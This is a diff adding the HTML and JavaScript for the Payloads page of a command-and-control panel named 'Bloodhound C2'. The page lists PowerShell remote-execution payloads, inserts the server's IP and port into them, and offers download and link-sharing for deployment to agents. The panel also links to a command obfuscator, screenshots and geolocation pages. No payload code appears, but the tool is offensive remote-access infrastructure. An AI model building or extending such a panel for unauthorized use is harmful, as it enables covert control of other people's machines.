@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payloads - Bloodhound C2</title>
+    <link rel="stylesheet" href="/static/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .payload-section {
+            margin-bottom: 30px;
+        }
+        
+        .payload-section h3 {
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .file-status {
+            background: var(--border-color);
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .file-status[style*="success"] {
+            background: rgba(76, 175, 80, 0.1);
+            border: 1px solid var(--success-color);
+        }
+        
+        .file-status[style*="warning"] {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid var(--warning-color);
+        }
+    </style>
+</head>
+<body>
+    <!-- Mobile Menu Toggle -->
+    <button class="mobile-menu-toggle" onclick="toggleSidebar()">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <!-- Sidebar Navigation -->
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <h1>Bloodhound C2</h1>
+            <div class="subtitle">Command & Control Server</div>
+        </div>
+        
+        <nav class="sidebar-nav">
+            <a href="/ui" class="nav-item">
+                <i class="fas fa-tachometer-alt"></i>
+                Dashboard
+            </a>
+            <a href="/ui" class="nav-item">
+                <i class="fas fa-server"></i>
+                Agents
+            </a>
+            <a href="/payloads" class="nav-item active">
+                <i class="fas fa-rocket"></i>
+                Payloads
+            </a>
+            <a href="/screenshots" class="nav-item">
+                <i class="fas fa-camera"></i>
+                Screenshots
+            </a>
+            <a href="/obfuscator" class="nav-item">
+                <i class="fas fa-code"></i>
+                Command Obfuscator
+            </a>
+            <a href="/scheduler" class="nav-item">
+                <i class="fas fa-clock"></i>
+                Task Scheduler
+            </a>
+            <a href="/geolocation" class="nav-item">
+                <i class="fas fa-map-marker-alt"></i>
+                Geolocation
+            </a>
+            <a href="/files" class="nav-item">
+                <i class="fas fa-file-upload"></i>
+                File Management
+            </a>
+            
+            <!-- Theme Toggle Button -->
+            <div class="theme-toggle-container" style="padding: 20px; text-align: center; border-top: 1px solid var(--border-color);">
+                <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()">
+                    <i class="fas fa-sun" id="themeIcon"></i>
+                </button>
+            </div>
+        </nav>
+    </div>
+
+    <!-- Main Content Area -->
+    <div class="main-content">
+        <div class="page-header fade-in">
+            <h2>Payload Management</h2>
+            <p class="description">Generate and manage deployment payloads for your agents</p>
+        </div>
+
+        <div class="card fade-in" style="margin-bottom: 20px;">
+            <div class="card-content">
+                <div style="display: flex; align-items: center; margin-bottom: 15px;">
+                    <i class="fas fa-info-circle" style="color: var(--primary-color); margin-right: 10px; font-size: 18px;"></i>
+                    <h3 style="margin: 0; color: var(--text-primary);">How It Works</h3>
+                </div>
+                <div style="color: var(--text-secondary); line-height: 1.6;">
+                    <p><strong>Source Templates:</strong> These files contain <code>{C2_HOST}:{C2_PORT}</code> placeholders that get automatically replaced with your current IP address and port.</p>
+                    <p><strong>Generated Payloads:</strong> Ready-to-use files with your actual IP address (currently <strong id="currentIP">detecting...</strong>). Click "Regenerate" to update all payloads with your current IP.</p>
+                    <p><strong>Auto-Generation:</strong> Payloads are automatically generated when the server starts. Use the "Regenerate" button to update them anytime.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="card fade-in">
+            <div class="card-header">
+                            <div>
+                <div class="card-title">Available Payloads</div>
+                <div class="card-subtitle">Ready for deployment across your network</div>
+            </div>
+            <div>
+                <button class="btn btn-secondary" onclick="regeneratePayloads()" style="margin-right: 10px;">
+                    <i class="fas fa-magic"></i> Regenerate
+                </button>
+                <button class="btn btn-primary" onclick="refreshPayloads()">
+                    <i class="fas fa-sync-alt"></i> Refresh
+                </button>
+            </div>
+            </div>
+            
+            <div id="payloadList" class="file-list">
+                <div style="text-align: center; padding: 40px; color: var(--text-secondary);">
+                    <i class="fas fa-spinner fa-spin" style="font-size: 24px; margin-bottom: 15px;"></i>
+                    <p>Loading payloads...</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="card fade-in">
+            <div class="card-header">
+                <div>
+                    <div class="card-title">Payload Information</div>
+                    <div class="card-subtitle">Understanding your deployment options</div>
+                </div>
+            </div>
+            <div class="grid grid-2">
+                <div>
+                    <h4 style="color: var(--primary-color); margin-bottom: 10px;">
+                        <i class="fas fa-info-circle"></i> PowerShell Scripts
+                    </h4>
+                    <p style="color: var(--text-secondary); line-height: 1.6;">
+                        PowerShell payloads are designed for Windows environments and provide 
+                        remote command execution capabilities. They automatically configure 
+                        connection parameters for your C2 server.
+                    </p>
+                </div>
+                <div>
+                    <h4 style="color: var(--secondary-color); margin-bottom: 10px;">
+                        <i class="fas fa-shield-alt"></i> Security Features
+                    </h4>
+                    <p style="color: var(--text-secondary); line-height: 1.6;">
+                        All payloads include built-in security measures and are generated 
+                        dynamically with your server's current network configuration. 
+                        Each deployment is unique and traceable.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Mobile menu toggle
+        function toggleSidebar() {
+            const sidebar = document.querySelector('.sidebar');
+            sidebar.classList.toggle('collapsed');
+        }
+
+        // Highlight current page in navigation
+        function highlightCurrentPage() {
+            const currentPath = window.location.pathname;
+            const navItems = document.querySelectorAll('.nav-item');
+            
+            navItems.forEach(item => {
+                item.classList.remove('active');
+                if (item.getAttribute('href') === currentPath) {
+                    item.classList.add('active');
+                }
+            });
+        }
+
+        function refreshPayloads() {
+            loadPayloads();
+            showNotification('Payloads refreshed', 'success');
+        }
+
+        function regeneratePayloads() {
+            // Show loading state
+            const btn = event.target.closest('button');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Regenerating...';
+            btn.disabled = true;
+            
+            fetch('/api/regenerate-payloads', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.message) {
+                    showNotification(data.message, 'success');
+                    // Refresh the payload list after regeneration
+                    setTimeout(() => {
+                        loadPayloads();
+                    }, 1000);
+                } else {
+                    showNotification(data.error || 'Failed to regenerate payloads', 'error');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                showNotification('Failed to regenerate payloads', 'error');
+            })
+            .finally(() => {
+                // Restore button state
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            });
+        }
+
+        function loadPayloads() {
+            const container = document.getElementById('payloadList');
+            
+            fetch('/api/payloads')
+                .then(res => res.json())
+                .then(payloads => {
+                    if (payloads.length === 0) {
+                        container.innerHTML = `
+                            <div style="text-align: center; padding: 40px; color: var(--text-secondary);">
+                                <i class="fas fa-folder-open" style="font-size: 48px; margin-bottom: 15px; opacity: 0.5;"></i>
+                                <p>No payloads available</p>
+                                <p style="font-size: 14px; margin-top: 10px;">Check your payloads directory for available files</p>
+                            </div>
+                        `;
+                        return;
+                    }
+
+                    container.innerHTML = payloads.map(payload => `
+                        <div class="file-item fade-in">
+                            <div class="file-name">
+                                <i class="fas fa-file-code" style="color: var(--primary-color); margin-right: 10px;"></i>
+                                <strong>${payload}</strong>
+                                <div style="font-size: 12px; color: var(--text-muted); margin-top: 5px;">
+                                    PowerShell Script • Ready for deployment
+                                </div>
+                            </div>
+                            <div class="file-actions">
+                                <button class="btn btn-primary btn-sm" onclick="downloadPayload('${payload}')">
+                                    <i class="fas fa-download"></i> Download
+                                </button>
+                                <button class="btn btn-secondary btn-sm" onclick="viewPayload('${payload}')">
+                                    <i class="fas fa-eye"></i> View
+                                </button>
+                                <button class="btn btn-secondary btn-sm" onclick="copyPayloadLink('${payload}')">
+                                    <i class="fas fa-link"></i> Copy Link
+                                </button>
+                            </div>
+                        </div>
+                    `).join('');
+                })
+                .catch(error => {
+                    console.error('Error loading payloads:', error);
+                    container.innerHTML = `
+                        <div style="text-align: center; padding: 40px; color: var(--danger-color);">
+                            <i class="fas fa-exclamation-triangle" style="font-size: 48px; margin-bottom: 15px;"></i>
+                            <p>Failed to load payloads</p>
+                            <p style="font-size: 14px; margin-top: 10px;">Please check your connection and try again</p>
+                        </div>
+                    `;
+                });
+        }
+
+        function downloadPayload(filename) {
+            window.open(`/payloads/${filename}`, '_blank');
+            showNotification(`Downloading ${filename}`, 'success');
+        }
+
+        function viewPayload(filename) {
+            window.open(`/payloads/${filename}`, '_blank');
+        }
+
+        function copyPayloadLink(filename) {
+            const link = `${window.location.origin}/payloads/${filename}`;
+            navigator.clipboard.writeText(link).then(() => {
+                showNotification('Payload link copied to clipboard', 'success');
+            }).catch(() => {
+                showNotification('Failed to copy link', 'error');
+            });
+        }
+
+        function viewGeneratedPayload(filename) {
+            window.open(`/generated/${filename}`, '_blank');
+        }
+
+        function downloadGeneratedPayload(filename) {
+            window.open(`/generated/${filename}`, '_blank');
+            showNotification(`Downloading generated ${filename}`, 'success');
+        }
+
+        function copyGeneratedPayloadLink(filename) {
+            const link = `${window.location.origin}/generated/${filename}`;
+            navigator.clipboard.writeText(link).then(() => {
+                showNotification('Generated payload link copied to clipboard', 'success');
+            }).catch(() => {
+                showNotification('Failed to copy link', 'error');
+            });
+        }
+
+        function showNotification(message, type = 'info') {
+            const notification = document.createElement('div');
+            notification.className = `notification notification-${type} fade-in`;
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                padding: 15px 20px;
+                border-radius: 8px;
+                color: white;
+                font-weight: 500;
+                z-index: 10000;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+                max-width: 300px;
+            `;
+
+            const colors = {
+                success: 'var(--success-color)',
+                error: 'var(--danger-color)',
+                warning: 'var(--warning-color)',
+                info: 'var(--primary-color)'
+            };
+
+            notification.style.background = colors[type] || colors.info;
+            notification.textContent = message;
+
+            document.body.appendChild(notification);
+
+            setTimeout(() => {
+                notification.style.opacity = '0';
+                notification.style.transform = 'translateX(100%)';
+                setTimeout(() => notification.remove(), 300);
+            }, 3000);
+        }
+
+        // Theme Management
+        function initTheme() {
+            const savedTheme = localStorage.getItem('theme') || 'dark';
+            setTheme(savedTheme);
+        }
+
+        function toggleTheme() {
+            const currentTheme = document.documentElement.getAttribute('data-theme');
+            const newTheme = currentTheme === 'light' ? 'dark' : 'light';
+            setTheme(newTheme);
+        }
+
+        function setTheme(theme) {
+            document.documentElement.setAttribute('data-theme', theme);
+            localStorage.setItem('theme', theme);
+            
+            const themeIcon = document.getElementById('themeIcon');
+            if (theme === 'light') {
+                themeIcon.className = 'fas fa-moon';
+                themeIcon.style.color = '#333';
+            } else {
+                themeIcon.className = 'fas fa-sun';
+                themeIcon.style.color = '#ffd700';
+            }
+        }
+
+        // Load payloads when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            initTheme(); // Initialize theme first
+            loadPayloads();
+            highlightCurrentPage(); // Call to highlight the current page
+            updateCurrentIP(); // Show current IP address
+        });
+
+        function updateCurrentIP() {
+            fetch('/api/current-ip')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ip) {
+                        document.getElementById('currentIP').textContent = `${data.ip}:${data.port}`;
+                    } else {
+                        document.getElementById('currentIP').textContent = 'Unknown';
+                    }
+                })
+                .catch(() => {
+                    document.getElementById('currentIP').textContent = 'Unknown';
+                });
+        }
+    </script>
+</body>
+</html>
